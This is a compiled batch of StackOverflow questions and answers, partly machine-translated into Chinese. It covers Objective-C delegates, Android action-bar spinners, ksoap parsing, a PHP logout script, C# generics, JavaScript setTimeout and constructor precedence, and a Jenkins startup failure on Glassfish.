# StackOverflow 问答 16184000-16184999

# ios - How do delegates work in objective c?

> ID：16184003
> 
> 赞同：1
> 
> 时间：2013-04-24T05:26:14.503
> 
> 标签：ios, objective-c, xcode, delegates

I'm trying to figure out delegates because I really need them for a project I'm working on, but for the life of me, I can't figure them out. No matter how much I tweak the code, nothing works

ViewController.h:

```
#import <UIKit/UIKit.h>

@class ViewController;

@protocol testDelegate
-(void)sayHi;
@end

@interface ViewController : UIViewController 

- (IBAction)button:(id)sender;
@property (weak, nonatomic)id <testDelegate> delegate;

@end 
```

ViewController.m:

```
#import "ViewController.h"
#import "DelegateController.h"

@interface ViewController ()

@end

@implementation ViewController

- (void)viewDidLoad
{
[super viewDidLoad];
// Do any additional setup after loading the view, typically from a nib.
DelegateController *dc = [[DelegateController alloc] init];
}

- (void)didReceiveMemoryWarning
{
[super didReceiveMemoryWarning];
// Dispose of any resources that can be recreated.
}

- (IBAction)button:(id)sender {
[self.delegate sayHi];
}
@end 
```

DelegateController.h:

```
#import "ViewController.h"

@interface DelegateController : UIViewController <testDelegate>

@end 
```

DelegateController.m:

```
#import "DelegateController.h"

@interface DelegateController ()

@end

@implementation DelegateController

- (id)initWithNibName:(NSString *)nibNameOrNil bundle:(NSBundle *)nibBundleOrNil
{
    self = [super initWithNibName:nibNameOrNil bundle:nibBundleOrNil];
    if (self) {
        NSLog(@"init");
        ViewController *vc = [[ViewController alloc] init];
        [vc setDelegate:self];
}
    return self;
}
-(void)viewDidLoad
{
    [super viewDidLoad];
}

-(void)sayHi
{
    NSLog(@"hi");
}

@end 
```

The - (IBAction)button:(id)sender method is connect to a button, but when clicked I get no output. What am I doing wrong?

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-24T05:53:29.713

视图控制器.h：

```
#import <UIKit/UIKit.h>

@protocol testDelegate
    -(void)sayHi;
@end

@interface ViewController : UIViewController 

@end 
```

视图控制器.m：

```
#import "ViewController.h"
#import "DelegateController.h"

@interface ViewController () <testDelegate>

@end

@implementation ViewController

- (IBAction)pushNewViewController:(id)sender
{
    DelegateController *dc = [[DelegateController alloc] init];
    dc.delegate = self;
    [self.navigationController pushViewController:dc animated:YES];
}

- (void)sayHi
{
    NSLog(@"It works!");
}
@end 
```

委托控制器.h：

```
#import "ViewController.h"

@interface DelegateController : UIViewController

@property (weak, nonatomic) id<testDelegate> delegate;

@end 
```

委托控制器.m：

```
#import "DelegateController.h"

@implementation DelegateController

- (IBAction)button:(id)sender
{
    if([_delegate respondsToSelector:@selector(sayHi)]) {
        [_delegate performSelector:@selector(sayHi)];
    }
}

@end 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-24T05:45:03.257

尝试这个：

### 视图控制器.h

```
#import <UIKit/UIKit.h>

@class ViewController;

@protocol testDelegate
-(void)sayHi;
@end

@interface ViewController : UIViewController 

- (IBAction)button:(id)sender;
@property (weak, nonatomic)id <testDelegate> delegate;

@end 
```

### 视图控制器.m

```
#import "ViewController.h"
#import "DelegateController.h"

@interface ViewController ()
@property (nonatomic, strong) DelegateController *dc;
@end

@implementation ViewController

- (void)viewDidLoad
{
   [super viewDidLoad];
   // Do any additional setup after loading the view, typically from a nib.
  _dc = [[DelegateController alloc] init];
  [self setDelegate:_dc];
}

- (void)didReceiveMemoryWarning
{
[super didReceiveMemoryWarning];
// Dispose of any resources that can be recreated.
}

- (IBAction)button:(id)sender
{
   [self.delegate sayHi];
}
@end 
```

### 委托控制器.h

```
@interface DelegateController : UIViewController <testDelegate>

@end 
```

### 委托控制器.m

```
#import "DelegateController.h"

@interface DelegateController ()

@end

@implementation DelegateController

- (id)initWithNibName:(NSString *)nibNameOrNil bundle:(NSBundle *)nibBundleOrNil
{
    self = [super initWithNibName:nibNameOrNil bundle:nibBundleOrNil];
    if (self)
    {
        NSLog(@"init");
    }
    return self;
}
-(void)viewDidLoad
{
    [super viewDidLoad];
}

-(void)sayHi
{
    NSLog(@"hi");
}

@end 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-24T05:32:25.950

Your problem is that ViewController creates DelegateController, then in DelegateController you're creating a new, different, instance of ViewController, and setting yourself as the delegate of that instance. Normally, the way you set a delegate is that DelegateController would create an instance of ViewController and set itself as the delegate. This assumes that DelegateController is created first, but exactly how to do this depends on your app structure, and how you move from controller to controller.

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-24T05:39:33.227

将您的按钮单击方法替换为以下

```
- (IBAction)button:(id)sender {
    // Check whether your Delegate method is implemeted or not
    if([delegate respondsToSelector:@selector(sayHi)])
    {
        // Call Delegate Method
        [delegate performSelector:@selector(sayHi)];
    }
} 
```

# android - 操作栏中的微调器只有图标但没有选定的选项

> ID：16184004
> 
> 赞同：7
> 
> 时间：2013-04-24T05:26:21.737
> 
> 标签：android, android-actionbar, spinner

我正在开发一个带有用于导航的操作栏的应用程序。现在我正在尝试将一个添加`Spinner`到`ActionBar`.

我可以在`ActionBar`. 但是当我将条目添加到微调器中时，图标隐藏在选择框后面，并选择了第一个项目。

我只想让图标出现在图标上，`ActionBar`并且`drop-down-list/spinner`在点击图标时出现。

这是我的代码：

```
private void initializeMenu(Menu menu) {
    MenuInflater inflater = getMenuInflater();
    inflater.inflate(R.menu.options, menu);

    View v = (View) menu.findItem(R.id.menuSort).getActionView();
    Spinner spinner=(Spinner)v.findViewById(R.id.bookmarks_menu);

    Bookmark bookmark1 = new Bookmark();
    Bookmark bookmark2 = new Bookmark();

    List<Bookmark> list = new ArrayList<Bookmark>();
    list.add(bookmark1);
    list.add(bookmark2);

    SpinAdapter adapter = new SpinAdapter(getApplicationContext(),0, list);
    spinner.setAdapter(adapter); 
} 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2016-03-13T15:25:37.997

仅图标`Spinner`可通过几个步骤实现。

**步骤1**

把你想要的图标放在xml中：

```
<Spinner
    ...
    android:background="@drawable/ic_sort_white_24dp" /> 
```

**第2步**

然后，在`adapter`, `Spinner`override`getView()`中，像这样：

```
ArrayAdapter<String> dataAdapter = new ArrayAdapter<String>(this, android.R.layout.simple_spinner_item, list){
        @Override
        public View getView(int position, View convertView, ViewGroup parent) {
            // this part is needed for hiding the original view
            View view = super.getView(position, convertView, parent);
            view.setVisibility(View.GONE);

            return view;
        }
}; 
```

**解释**

我们需要了解，在适配器中是未打开`getView()`时将使用的视图。`Spinner`我们制作可见性`gone`是因为我们不想看到它，所以剩下的就是`Spinner`来自 xml 的背景，我在这个例子中已经设置了`ic_sort_white_24dp`（步骤 1）。

不要与哪个用于在单击`getDropDownView()`后将下拉的选项行混淆。`Spinner`

**奖金截图！**

这就是我的样子。希望能帮助到你！

[![截屏](https://i.stack.imgur.com/7bQCql.png)](https://i.stack.imgur.com/7bQCql.png)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-06-26T19:21:53.457

在您的适配器中，您需要覆盖 getDropDownView()。这应该提供微调器行中使用的视图。getView() 然后应该为您的图标返回一个 ImageView。

有关更多详细信息和示例，请参阅有关类似问题的以下 2 个答案：

*   [操作栏微调器自定义](https://stackoverflow.com/questions/15193598/actionbar-spinner-customisation/15293471#15293471)
*   [getview 和 getdropdownview 的区别](https://stackoverflow.com/questions/13433874/difference-between-getview-getdropdownview-in-spinneradapter/13433875#13433875)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-24T06:32:23.620

检查它的工作..

![在此处输入图像描述](https://i.stack.imgur.com/sbP3V.png)

```
public class MainActivity extends Activity {

    final String[] choices = { "Android", "iOS", "RIM" };
    final int[] choices_img = { R.drawable.ic_launcher, R.drawable.ios,
            R.drawable.black };

    @SuppressLint("NewApi")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        ActionBar actionBar = getActionBar();
        actionBar.setNavigationMode(ActionBar.NAVIGATION_MODE_LIST);

        ArrayAdapter<String> adapter = new ArrayAdapter<String>(
                MainActivity.this, android.R.layout.simple_dropdown_item_1line,
                choices);
        ListViewAdapter adapter1 = new ListViewAdapter(MainActivity.this);
        actionBar.setListNavigationCallbacks(adapter1,
                new OnNavigationListener() {
                    @Override
                    public boolean onNavigationItemSelected(int itemPosition,
                            long itemId) {
                        Toast.makeText(MainActivity.this,
                                choices[itemPosition], Toast.LENGTH_SHORT)
                                .show();
                        return false;
                    }
                });
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.main, menu);
        return true;
    }

    public class ListViewAdapter extends BaseAdapter {

        private LayoutInflater mInflater;

        public ListViewAdapter(Context con) {
            // TODO Auto-generated constructor stub
            mInflater = LayoutInflater.from(con);
        }

        public int getCount() {
            // TODO Auto-generated method stub
            return choices.length;
        }

        public Object getItem(int position) {
            // TODO Auto-generated method stub
            // return product_id1.size();
            return position;
        }

        public long getItemId(int position) {
            // TODO Auto-generated method stub
            // return product_id1.get(position).hashCode();
            return position;
        }

        @SuppressLint("NewApi")
        public View getView(final int position, View convertView,
                ViewGroup parent) {
            // TODO Auto-generated method stub
            final ListContent holder;
            View v = convertView;
            if (v == null) {
                v = mInflater.inflate(R.layout.scan_row1, null);
                holder = new ListContent();

                holder.name = (TextView) v.findViewById(R.id.textView1);

                holder.img_p = (ImageView) v.findViewById(R.id.imageView1);

                // holder.total_rate.setOnClickListener(mOnTitleClickListener1);

                v.setTag(holder);
            } else {

                holder = (ListContent) v.getTag();
            }

            holder.img_p.setBackground(getResources().getDrawable(
                    choices_img[position]));
            holder.name.setText("" + choices[position]);

            return v;
        }
    }

    static class ListContent {

        ImageView img_p;
        TextView name;

    }

} 
```

如果你只想要图标，那么只需在 scan_row1.xml 中使用图像视图

# android - 从 HttpTransportSE.responseDump 获取 ksoap 对象

> ID：16184006
> 
> 赞同：2
> 
> 时间：2013-04-24T05:26:30.410
> 
> 标签：android, ksoap2, android-ksoap2

我不知道如何在将`transport.responseDump`返回字符串（字符串形式的 xml 数据）转换为 ksoap 对象时继续进行。可能是一些代码片段将帮助我描述我的问题：

```
synchronized (transportLockObject)
        {
            transport.debug = true;            
            String soapAction = TARGET_NAMESPACE+"/"+method;

            try {
                transport.call(soapAction, envelope);
            } catch (SSLHandshakeException she) {
                she.printStackTrace();          
            }
        }
         System.out.println("Response ----------"+transport.responseDump); 
```

这就是我获得 responseDump 的方式。我正在保存这个转储，以便以后可以使用它（比如当我不想要实际的在线数据用于测试目的或没有连接[*无论*]时）。后来我通常做的是

```
 Object response = envelope.getResponse();

        //Check if response is available... if yes parse the response
        if (response != null)
        {
            if (myResponse != null)
            {
                myResponse.parse(response);
            }
        } 
```

我在 parse() 中传递的这个响应实际上是一个肥皂对象。**任何人都可以告诉我如何将我从 transport.responseDump 返回的值转换为肥皂对象，以便我可以将它传递给 parse() 方法吗？**

任何线索或链接都会有所帮助。任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-07-15T08:14:30.740

您可以使用“bodyIn”而不是“getResponse”

后

```
httpTransport.call(SOAP_ACTION, soapEnvelope); 
```

利用

```
SoapObject result = (SoapObject) soapEnvelope.bodyIn;
UserDefined resultVariable = new UserDefined(j); 
```

UserDefined 构造函数应该能够处理这个问题。

如果您期望的对象是用户定义的对象，您应该使用 kvmserializable 来实现它。你可以在这里找到一些例子。

[KSoap2 和 KvmSerializable - 如何发送复杂的对象，如 Stringarrays](https://stackoverflow.com/questions/10999763/ksoap2-and-kvmserializable-how-to-send-complex-objects-like-stringarrays)

# c++ - NetBeans IDE: "Run Success" Output Occurs Before Output Finishes

> ID：16184008
> 
> 赞同：2
> 
> 时间：2013-04-24T05:26:34.983
> 
> 标签：c++, c, netbeans

I made a C program that prints out a lot of values from a binary file. I believe the program finishes it's functions and ends before it actually displays values it spits out. So as a result I get a lovely `RUN SUCCESSFUL (total time: 198ms)` plopped right in the middle of my nicely formatted output, successfully screwing with the continuity of the rest. Is there a non-intrusive way to fix this?

I have tried a while loop encasing main's return value with a `scanf()` to pause the program until the user enters any value other than `0` but I'd prefer it if I could just have it run like a 'normal' program which in this case is without any user input. Thanks in advance for any advice or tips. :)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T04:53:03.950

Jesse Good 是对的，这曾经是 NetBeans 中的一个错误。因此，您可以尝试以下方法：

a) 检查是否刷新缓冲区，即，如果您使用 printf()，输出在实际写入控制台之前被缓冲。尝试使用`fflush(stdout);`之前`return`。（但我想不是这样。实际上缓冲区应该在返回之前自动刷新，所以我认为这不会解决它，但你永远不知道 :-)）

b) 检查您是否拥有最新版本（v7.3，2013-02-21），因为该错误已在 Nightly Build 2012-09-21 中修复。也许甚至 v7.2.1, 2012-10-22 就足够了，但 v7.2 绝对不是。

-汉内斯

# php - Alternative to PHP deprecated function session_is_registered() for logout.php file

> ID：16184012
> 
> 赞同：1
> 
> 时间：2013-04-24T05:26:54.520
> 
> 标签：php

I'm trying to create a simple member login site, and I was following along with a tutorial online. However, a deprecated function is used. Here is the code.

```
<?php
session_start();

session_destroy();

if(isset($_COOKIE['id']))
{
    //remove cookie
    setcookie("$id_cookie", '', time() - 50000);
    setcookie("$pass_cookie", '', time() - 50000);
}

if(!session_is_registered('username'))
{
    header("Location: index.php");
}
else
{
    exit('Sorry we could not log you out');
}

?> 
```

I also tried `!isset($_SESSION['username'])`, but every time I try to log out, I just receive the 'Sorry we could not log you out' text.

Here is the part of my login.php file code where I set the sessions:

```
//member does exist, start sessions
$_SESSION['password'] = $password;

while($row = mysql_fetch_array($query))
{
    $username = $row['username'];
    $id = $row['id'];
}

$_SESSION['username'] = $username;
$_SESSION['id'] = $id; 
```

Any help would be great!

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-24T05:27:55.170

不要使用

```
session_is_registered 
```

利用

```
if (isset($_SESSION['SESSION_VARIABLE_NAME'])) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-24T05:51:34.730

您可以添加“session_unset();” 在“session_destroy();”之前

session_destroy() 删除会话文件并释放会话 ID，但将 $_SESSION 变量保留在内存中。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-24T10:26:13.487

在您的注销脚本中尝试此代码

```
<?php
session_start();

if(isset($_SESSION['id']))
{
    unset($_SESSION['username']);
    unset($_SESSION['id']);
}

if(!isset($_SESSION['username']))
{
    header("Location: index.php");
}
else
{
    exit('Sorry we could not log you out');
}

?> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-24T05:28:26.563

用这个`isset`

```
if(!isset($_SESSION['username'])) 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-04-24T05:31:39.747

Try this

```
echo "<pre>";
   print_r($_SESSION);
echo "</pre>";

if(!isset($_SESSION['username']))
{
    header("Location: index.php");
} 
```

Check where the the SESSSION is stored or not.

# c# - how to use classes themselves as method parameters?

> ID：16184014
> 
> 赞同：4
> 
> 时间：2013-04-24T05:27:10.867
> 
> 标签：c#, class, methods

Its been a while but i need to convert some custom code into C# (i think it was called emeralds or something somebody else gave to me). there is a certain method that takes a class(any class without any object conversions). this is the code im trying to convert.

```
 class  management
        Accessor current_class
        Accessor class_Stack

      def call(next_class)          #method, called global, takes a "class" instead 
                                       #of a variable, kinda odd
        stack.push(current_class)      #stack handling
        current_class = next_class.new #makes a new instance of specified next_class

      end
    end 
```

next_class seems to be any class related to a base class and assigns a new instance of them to a variable called currentClass. there are other "methods" that do something similar. I've tried setting the parameter type to "object", but loses all the the "next_class" attributes that are needed. this is my attempt at it

```
 public class management {
        public Stack stack;           
        public Someclass currentClass; 

      public void Call(object nextClass) {
        stack.push(currentClass);   // stack handling    
        currentClass = new nextClass(); // conversion exception, otherwise loss of type

    }
    } 
```

IS this even possible in C# another thing this language seems to able to keep attributes(methods too) from Child classes when you cast them as a base class. e.g cast green bikes as just bikes but it will still be green

can somebody point me in the right direction here? or do i need to rewrite it and change the way it does things?

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-04-24T05:30:13.567

您想要的是泛型，我也认为，基于您将方法称为接口的事实。

因此，您的接口将定义“新”，并且类将从接口继承。

然后，您可以将该类作为泛型传递并在其上调用“new”的接口方法。

所以;

```
public interface IMyInterface
{
  void newMethod();
}

public class MyClass1 : IMyInterface
{
    public void newMethod()
    {
      //Do what the method says it will do.
    }
}

public class Class1
{
    public Class1()
    {
        MyClass1 classToSend = new MyClass1();
        test<IMyInterface>(classToSend);
    }

    public void test<T>(T MyClass) where T : IMyInterface
    {
        MyClass.newMethod();
    }
} 
```

**编辑**

并查看 C# 4.0 中的“动态”。我这样说是因为如果您直到运行时才知道该方法是什么，您可以将其定义为动态的，并且您基本上是在告诉编译器“相信我，该方法将在那里”。

这是在你不能使用泛型的情况下，因为你调用的方法对于每个类都是不同的。

# cordova - 从 jquery mobile 和 phonegap 开始的最佳链接

> ID：16184021
> 
> 赞同：0
> 
> 时间：2013-04-24T05:27:48.150
> 
> 标签：cordova

我想从 jqueymobile 和 phonegap 开始。我查看了很多链接，但我没有得到正确的信息。有人可以为我提供设置 eclipse for phonegap 并开始使用 phonegap 和 jquery mobile 的最佳链接吗？我对 jquery mobile 和 phonegap 很陌生。请帮助我开始。

谢谢：）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-24T16:51:07.010

制作游戏的官方链接： [https ://build.phonegap.com/blog/my-first-mobile-game-in-html-with-phonegap-build](https://build.phonegap.com/blog/my-first-mobile-game-in-html-with-phonegap-build)

或者

[http://mobile.tutsplus.com/tutorials/phonegap/creating-an-android-hello-world-application-with-phonegap/](http://mobile.tutsplus.com/tutorials/phonegap/creating-an-android-hello-world-application-with-phonegap/)

希望这可以帮助

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-02-17T11:10:19.210

你可以检查一下。代码示例也可在此处获得。 [http://www.alltechstories.com/setup-phonegap-eclipse-develop-first-android-game/](http://www.alltechstories.com/setup-phonegap-eclipse-develop-first-android-game/)

# android - How to create Android Application with Phonegap?

> ID：16184024
> 
> 赞同：-12
> 
> 时间：2013-04-24T05:27:54.723
> 
> 标签：android, xml, image

How to `Installing` and configuring `PhoneGap for Android mobile development` with Eclipse. can i get sample phonegap projects with android.

pls provide Phonegap tutorial or pdf files.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-24T05:31:38.810

Visit Phonegap website and look around. They have everything available on their website.

This will help you getting started.

[http://docs.phonegap.com/en/2.6.0/guide_getting-started_android_index.md.html#Getting%20Started%20with%20Android](http://docs.phonegap.com/en/2.6.0/guide_getting-started_android_index.md.html#Getting%20Started%20with%20Android)

# javascript - 是否可以将 setTimeout 函数存储在本地存储中？

> ID：16184027
> 
> 赞同：1
> 
> 时间：2013-04-24T05:27:59.557
> 
> 标签：javascript, jquery, local-storage, settimeout

前提是我有下面的 javascript 代码。

```
var timeout = setTimeout(function(){
                alert('this is executed after 5 seconds');
              }, 5000);

localStorage.setItem('timeout_event', timeout); 
```

我已经检查了 setTimeout 函数的返回值是一个 id 什么的。如果用户刷新页面，如何重新运行超时事件？甚至可能吗？

任何帮助都可以。先感谢您。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-24T08:32:15.287

> 我已经检查了`setTimeout`函数的返回值是一个 id 什么的。

是的，它是一个数字 ID，您可以传递给它`clearTimeout`以取消计划的函数运行。

> 如果用户刷新页面，如何重新运行超时事件？

是的，当页面卸载时，所有未完成的超时都会中止，因此您需要在新页面上重新启动超时。

> 甚至可能吗？

是和不是。您将无法运行您从最后一页安排的功能 - 它的所有上下文/范围都将丢失 - 您需要在新页面的上下文中创建一个新功能。

但是，如果您想基于跨页面的超时/间隔来执行某些功能，您可以使用[DOM 存储](https://developer.mozilla.org/en-US/docs/DOM/Storage)或类似方法来实现。您将存储指定函数运行的时间戳，以及它是否已经运行的标志。这样，您可以在以下页面上检查是否以及何时需要重新安排该功能。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-24T08:37:50.290

Thanks for the help guys.

I managed to find a way to solve the problem.

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>

    <title>Testing</title>
    <script type="text/javascript">
        var timeout_time = 10;
        var time_remaining = 0;

        if(localStorage.getItem('timeout_time')==null){
            run_timeout(timeout_time);
        }
        else{
            run_timeout(localStorage.getItem('timeout_time'))
        }

        setInterval(function(){
            time_remaining = localStorage.getItem('timeout_time');

            if(time_remaining > 1 || time_remaining != null){
                localStorage.setItem('timeout_time', time_remaining - 1);
            }
        }, 1000);

        function run_timeout(time){
            setTimeout(function(){
                alert('executed on 10 seconds');
                localStorage.removeItem('timeout_time');
            }, time * 1000);
            localStorage.setItem('timeout_time', time);
        }

    </script>
</head>
<body>
    This is the test page.
</body>
</html> 
```

I hope this can be useful for others.

Again, thank you all.

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-24T05:33:26.047

如果您希望在页面刷新时执行超时功能，您只需将功能添加到`window.onload`

```
var timeout = setTimeout(function(){
                alert('this is executed after 5 seconds');
              }, 5000);

window.onload = timeout; 
```

这对我来说很好

如果你希望它被执行多次，然后去[setInterval()](http://www.w3schools.com/jsref/met_win_setinterval.asp)

```
var timeout = setInterval(function(){
                alert('this is executed for each second');
              }, 1000);

window.onload = timeout; 
```

它会一直执行到你调用`clearInterval(timeout);`

如果你想要多个超时，那么你应该做这样的事情

```
var timeout = setTimeout(function(){
                alert('this is executed after 1 second');
              }, 1000);

var timeout1 = setTimeout(function(){
                alert('this is executed after 2 seconds');
              }, 2000);

var timeout2 = setTimeout(function(){
                alert('this is executed after 3 seconds');
              }, 3000);
window.onload = timeout;timeout1;timeout2; 
```

这是因为 setTimeout 会在页面刷新后立即计算时间，这对我来说很好用

# javascript - 令人费解的 Javascript 构造函数问题

> ID：16184031
> 
> 赞同：9
> 
> 时间：2013-04-24T05:28:28.110
> 
> 标签：javascript

我在使用 JavaScript 时遇到了一个非常令人费解的问题。看看下面的代码..

```
az={
   classes:{
      test:function(){
        this.hello=function(name){
          alert('hello '+name);
        }
      }
   },
   getClass:function(name){
    return az.classes[name];
   }
};
var a=new az.classes['test']();
a.hello('foo');
var b= new az.getClass('test')();
b.hello();// fails !!! 
```

在代码中，如果您注意到我们在对象中定义了一个类`az.classes`。当尝试通过 new 创建该类的实例时`az.classes['test]()`，它可以正常工作并`a.hello()`执行。但是当我调用该方法时`az.getClass('test')`，该方法又返回相同的构造函数，但是当我`var b=new az.getClass('test');`在这里说它`b`时它失败了`undefined`！失败了`b.hello()`！！我不明白这种行为！`az.classes['test']()`new和 new有什么区别`az.getClass('test')`。他们不是一回事吗？？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-24T05:40:25.580

实例化构造函数时，第一个括号指示在构造函数中使用什么。

所以`new az.classes['test']();`将执行表达式`az.classes['test']`并将结果函数用作构造函数。

或重构，它这样做：

```
// new az.classes['test']()
//                       ^ expression left of here used as constructor!
var MyConstructor = az.classes['test'];
new MyConstructor(); 
```

但是，`new az.getClass('test')();`执行`az.getClass`返回类 getter 函数的表达式，并尝试将其用作构造函数。然后您的实例尝试使用`()`.

或重构，它这样做：

```
// new az.getClass('test')();
//                ^ expression left of here used as constructor!
var MyConstructor = az.getClass;
var instance = new MyConstructor('test');
instance(); // obviously not gonna work. 
```

看到不同？

您可以通过在应该返回构造函数的表达式周围包裹更多的括号来解决这个问题：

```
new (az.getClass('test'))();
//                       ^ expression left of here used as constructor! 
```

或者通过将构造函数引用保存到局部变量，然后在下一行使用它。这可能更理智和可读：

```
var MyConstructor = az.getClass('test');
new MyConstructor();
//               ^ expression left of here used as constructor! 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-24T05:37:44.470

JavaScript 中的构造函数可以返回一个值，该值替换通常由“new”表达式返回的值。

所以`new az.getClass("test")()`将首先评估`az.getClass("test")`哪个将返回一个函数。然后，您使用 () 调用该函数，该函数将返回 undefined，因为它没有返回值。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-24T05:35:36.447

这是括号（运算符优先级）的问题。这应该有效：

```
var b = new (az.getClass('test'))(); 
```

[http://jsbin.com/odajet/1/edit](http://jsbin.com/odajet/1/edit)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-24T05:36:47.397

`var b = new az.getClass('test')();`

相当于先获取类：

```
var b = new az.classes.getClass('test'); 
```

b 现在是**class** `az.test`，而不是它的实例。

进而：

```
b = b(); 
```

使用全局对象调用类构造函数 this

# java - cannot run jenkins, even after clearing it's directory

> ID：16184035
> 
> 赞同：1
> 
> 时间：2013-04-24T05:28:42.617
> 
> 标签：java, jenkins

Tried to upgrade jenkins today. It doesn't start anymore.

Even if i try to remove its directory, it recreates it cleanly but then crashes with following log.

```
[#|2013-04-24T07:24:49.849+0200|INFO|glassfish3.1.2|javax.enterprise.system.tools.admin.org.glassfish.deployment.admin|_ThreadID=106;_ThreadName=Thread-2;|jenkins was successfully deployed in 3,800 milliseconds.|#]

[#|2013-04-24T07:24:50.100+0200|INFO|glassfish3.1.2|jenkins.InitReactorRunner|_ThreadID=152;_ThreadName=Thread-2;|Listed all plugins|#]

[#|2013-04-24T07:24:50.100+0200|SEVERE|glassfish3.1.2|jenkins.InitReactorRunner|_ThreadID=152;_ThreadName=Thread-2;|Failed Loading plugins
java.lang.NullPointerException
        at hudson.PluginManager$2$1.run(PluginManager.java:324)
        at org.jvnet.hudson.reactor.TaskGraphBuilder$TaskImpl.run(TaskGraphBuilder.java:146)
        at org.jvnet.hudson.reactor.Reactor.runTask(Reactor.java:259)
        at jenkins.model.Jenkins$7.runTask(Jenkins.java:888)
        at org.jvnet.hudson.reactor.Reactor$2.run(Reactor.java:187)
        at org.jvnet.hudson.reactor.Reactor$Node.run(Reactor.java:94)
        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1110)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:603)
        at java.lang.Thread.run(Thread.java:722)
|#]

[#|2013-04-24T07:24:50.102+0200|SEVERE|glassfish3.1.2|hudson.WebAppMain|_ThreadID=143;_ThreadName=Thread-2;|Failed to initialize Jenkins
org.jvnet.hudson.reactor.ReactorException: java.lang.NullPointerException
        at org.jvnet.hudson.reactor.Reactor.execute(Reactor.java:246)
        at jenkins.InitReactorRunner.run(InitReactorRunner.java:43)
        at jenkins.model.Jenkins.executeReactor(Jenkins.java:899)
        at jenkins.model.Jenkins.<init>(Jenkins.java:801)
        at hudson.model.Hudson.<init>(Hudson.java:81)
        at hudson.model.Hudson.<init>(Hudson.java:77)
        at hudson.WebAppMain$2.run(WebAppMain.java:214)
Caused by: java.lang.NullPointerException
        at hudson.PluginManager$2$1.run(PluginManager.java:324)
        at org.jvnet.hudson.reactor.TaskGraphBuilder$TaskImpl.run(TaskGraphBuilder.java:146)
        at org.jvnet.hudson.reactor.Reactor.runTask(Reactor.java:259)
        at jenkins.model.Jenkins$7.runTask(Jenkins.java:888)
        at org.jvnet.hudson.reactor.Reactor$2.run(Reactor.java:187)
        at org.jvnet.hudson.reactor.Reactor$Node.run(Reactor.java:94)
        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1110)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:603)
        at java.lang.Thread.run(Thread.java:722)
|#] 
```

Jenkins 1.512 on Glassfish 3.1.2.2

EDIT: version 1.421 works. Version 1.422 fails. This is consistent, even after wiping jenkins directory.

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-06-19T21:41:12.187

找到了这个，我有 2 个虚拟服务器：

[https://gist.github.com/andrewg4153/3693577](https://gist.github.com/andrewg4153/3693577)

> 如果您有一个带有多个虚拟服务器的 Glassfish 域，那么在部署 Jenkins CI Web 应用程序时，您会很想选择它们。这是一件坏事，因为 Jenkins 核心代码包含一个单例类： [http](http://sorcerer.jenkins-ci.org/source-view.html?jenkins/model/Jenkins.js#678) ://sorcerer.jenkins-ci.org/source-view.html?jenkins/model/Jenkins.js#678 当你这样做时，您将在日志中获得以下信息： java.lang.IllegalStateException: second instance at jenkins.model.Jenkins.(Jenkins.java:744) at hudson.model.Hudson.(Hudson.java:81) at hudson.model .Hudson.(Hudson.java:77) at hudson.WebAppMain$2.run(WebAppMain.java:217) 只需部署到其中一台虚拟服务器，一切都会好起来的。

我部署在其中 1 个上，现在可以正常工作了！

好吧，我想这是要修复的错误...

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-30T13:45:31.437

根据您提供的堆栈跟踪：也许缺少一些插件[Task Scanner Plugin](https://wiki.jenkins-ci.org/display/JENKINS/Task+Scanner+Plugin)或其依赖关系破坏了您的 Jenkins 实例？

```
Caused by: java.lang.NullPointerException
    at hudson.PluginManager$2$1.run(PluginManager.java:324)
    at org.jvnet.hudson.reactor.TaskGraphBuilder$TaskImpl.run(TaskGraphBuilder.java:146) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-26T17:46:27.843

Jenkins 版本 1.422 存在启动问题。1.423 应该修复它。我的建议是清理安装 1.423 看看是否能解决问题。如果是这样，请尝试从那里升级。

# objective-c - Objective-C Why use init?

> ID：16184036
> 
> 赞同：1
> 
> 时间：2013-04-24T05:28:47.000
> 
> 标签：objective-c, object, init

I'm reading my first book on Objective-C [Programming in Objective-C 4th Edition], I'm midway through the book but one thing that bugs me, is that it didn't explain WHY we initialize objects.

I tried playing around with the with objects, for example allocating their memory but not initiating them and everything in the program works the same as before.

I'd appreciate some example explaining this, also.

* * *

